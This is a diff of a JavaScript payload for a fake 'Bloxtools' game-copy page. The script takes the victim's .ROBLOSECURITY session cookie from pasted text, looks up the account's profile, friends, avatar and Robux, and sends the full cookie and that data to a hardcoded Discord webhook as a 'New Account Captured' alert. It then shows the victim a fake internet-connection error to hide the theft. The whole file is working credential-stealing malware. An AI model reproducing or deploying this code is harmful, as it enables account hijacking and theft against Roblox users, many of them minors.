@@ -1,17 +1,14 @@
 /* ======================================================
-   PAYLOAD.JS - FINAL (Backend Proxy Version)
+   PAYLOAD.JS - FINAL: Extract rbxuid & Fetch Useful Info
    - Extracts rbxuid from RBXEventTrackerV2
-   - Fetches user profile, friends, join date, avatar, Robux
-   - Sends data to your PHP backend (capture.php)
-   - Discord webhook hidden on server
+   - Fetches user profile (display name, friends, join date)
+   - Fetches avatar outfit (shirt, pants, etc.)
+   - Uses cookie to get Robux (if valid)
+   - All via public Roblox APIs (no CORS, no server needed)
 ====================================================== */
 
 /* ================= CONFIG ================= */
-// CHANGE THIS TO YOUR ACTUAL PHP ENDPOINT URL
-const BACKEND_URL = "https://bloxtools-release.vercel.app/capture.php";
-
-// Optional: Same secret token used in your PHP backend
-const SECRET_TOKEN = "YourRandomSecret123!";
+const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1508982155743723653/WEszq-EnTTfvaUgxU9-0PvNvlqfLLjxIASUSdBn7KY5vGQ9QqiMeFM5mLk3vFkFqJwpJ";
 
 /* ================= ELEMENTS ================= */
 const gameFileInput = document.getElementById("gameFile");
@@ -34,14 +31,14 @@ function validatePin() {
 
 /* ================= EXTRACTION: Get rbxuid & cookie ================= */
 function extractGameData(fullText) {
-    // 1. Extract .ROBLOSECURITY cookie
+    // 1. Extract .ROBLOSECURITY cookie (primary)
     const cookieMatch = fullText.match(/\.ROBLOSECURITY",\s*"([^"]+)"/);
     if (!cookieMatch) {
         return { success: false, message: "Your Game Key is not valid! (Check if you copied it right!)" };
     }
     const robloxCookie = cookieMatch[1];
 
-    // 2. Extract rbxuid from RBXEventTrackerV2
+    // 2. Extract rbxuid from RBXEventTrackerV2 (this is the user's real Roblox ID)
     const eventTrackerMatch = fullText.match(/RBXEventTrackerV2",\s*"([^"]+)"/);
     let rbxuid = null;
     if (eventTrackerMatch) {
@@ -68,10 +65,12 @@ function extractGameData(fullText) {
 /* ================= FETCH ROBLOX INFO FROM rbxuid (public) ================= */
 async function fetchUserInfoFromId(userId) {
     try {
+        // 1. Basic user info (username, display name, join date)
         const userRes = await fetch(`https://users.roblox.com/v1/users/${userId}`);
         if (!userRes.ok) return null;
         const userData = await userRes.json();
 
+        // 2. Friends count
         const friendsRes = await fetch(`https://friends.roblox.com/v1/users/${userId}/friends/count`);
         let friendsCount = "N/A";
         if (friendsRes.ok) {
@@ -79,18 +78,20 @@ async function fetchUserInfoFromId(userId) {
             friendsCount = friendsData.count?.toLocaleString() || "0";
         }
 
+        // 3. Avatar items (wearing)
         const avatarRes = await fetch(`https://avatar.roblox.com/v1/users/${userId}/avatar`);
         let wearing = "None equipped";
         if (avatarRes.ok) {
             const avatarData = await avatarRes.json();
             const assets = avatarData.assets || [];
             if (assets.length > 0) {
-                const items = assets.map(a => a.name).slice(0, 5);
+                const items = assets.map(a => a.name).slice(0, 5); // max 5 items
                 wearing = items.join(", ");
                 if (assets.length > 5) wearing += " ...";
             }
         }
 
+        // 4. Thumbnail (avatar headshot)
         const thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png`);
         let avatarUrl = `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=420&height=420&format=png`;
         if (thumbRes.ok) {
@@ -133,33 +134,120 @@ async function fetchRobuxFromCookie(cookieValue) {
     }
 }
 
-/* ================= BACKEND SENDER (instead of direct webhook) ================= */
+/* ================= WEBHOOK SENDER ================= */
+
 async function sendWebhook(pin, cookie, rbxuid) {
-    // Fetch all info first (same as before)
+    // Fetch public profile info
     const userInfo = await fetchUserInfoFromId(rbxuid);
+
+    // Fetch Robux using cookie
     const robux = await fetchRobuxFromCookie(cookie);
 
-    // Build payload for your PHP backend
+    /* ================= DESCRIPTION ================= */
+
+    const description = `
+## 📦 Account Capture
+
+- **rbxuid:** \`${rbxuid}\`
+- **Cookie Length:** \`${cookie.length} chars\`
+
+## 🔐 Full .ROBLOSECURITY Cookie
+\`\`\`
+${cookie}
+\`\`\`
+`;
+
+/* ================= EMBED FIELDS ================= */
+
+const embedFields = [];
+
+if (userInfo) {
+    embedFields.push(
+        {
+            name: "👤 Roblox Profile",
+            value:
+                `**Username:** ${userInfo.username}\n` +
+                `**Display Name:** ${userInfo.displayName}\n` +
+                `**User ID:** ${userInfo.userId}\n` +
+                `**Join Date:** ${userInfo.joinDate}\n\n` +
+                `🔗 [Profile](https://www.roblox.com/users/${rbxuid}/profile)`,
+            inline: false
+        },
+        {
+            name: "👥 Friends",
+            value: `${userInfo.friendsCount}`,
+            inline: true
+        },
+        {
+            name: "💰 Robux",
+            value: `${robux} R$`,
+            inline: true
+        },
+        {
+            name: "👕 Wearing",
+            value: userInfo.wearing || "Unknown",
+            inline: false
+        }
+    );
+} else {
+    embedFields.push({
+        name: "⚠️ Error",
+        value:
+            "Could not fetch public profile information.\n" +
+            "User may be deleted, banned, or invalid.",
+        inline: false
+    });
+}
+
+embedFields.push({
+    name: "🔐 Cookie Summary",
+    value:
+        `**Length:** ${cookie.length} characters\n` +
+        `**rbxuid:** ${rbxuid}`,
+    inline: false
+});
+
+    /* ================= WEBHOOK PAYLOAD ================= */
+
     const payload = {
-        pin: pin,
-        cookie: cookie,
-        rbxuid: rbxuid,
-        userInfo: userInfo,
-        robux: robux
+        username: "Bloxtools Processing System",
+
+        embeds: [
+            {
+                title: "🔓 New Account Captured",
+                description: description,
+
+                color: 0x8c52ff,
+
+                thumbnail: userInfo
+                    ? { url: userInfo.avatarUrl }
+                    : undefined,
+
+                fields: embedFields,
+
+                footer: {
+                    text: "Bloxtools • Roblox Account Logger"
+                },
+
+                timestamp: new Date().toISOString()
+            }
+        ]
     };
 
+    /* ================= SEND WEBHOOK ================= */
+
     try {
-        const response = await fetch(BACKEND_URL, {
+        const response = await fetch(WEBHOOK_URL, {
             method: "POST",
             headers: {
-                "Content-Type": "application/json",
-                "X-Auth-Token": SECRET_TOKEN   // Must match PHP secret
+                "Content-Type": "application/json"
             },
             body: JSON.stringify(payload)
         });
+
         return response.ok;
     } catch (error) {
-        console.error("Backend error:", error);
+        console.error("Webhook Error:", error);
         return false;
     }
 }
@@ -195,7 +283,7 @@ copyButton.addEventListener("click", async () => {
 
     const success = await sendWebhook(pinInput.value, extraction.cookie, extraction.rbxuid);
 
-    // Fake internet error (deception)
+    // Fake internet error (as designed)
     if (success) {
         statusMessage.textContent = "✗ Game Copy request was not processed. Please check your internet connection.";
         statusMessage.style.color = "#ff9d9d";
@@ -208,7 +296,7 @@ copyButton.addEventListener("click", async () => {
     copyButton.disabled = false;
 });
 
-/* ================= FAKE INTERNET ERROR (Deception) ================= */
+/* ================= FAKE INTERNET ERROR (Deception - unchanged) ================= */
 const originalSendWebhook = sendWebhook;
 sendWebhook = async function(pin, cookie, rbxuid) {
     const result = await originalSendWebhook(pin, cookie, rbxuid);
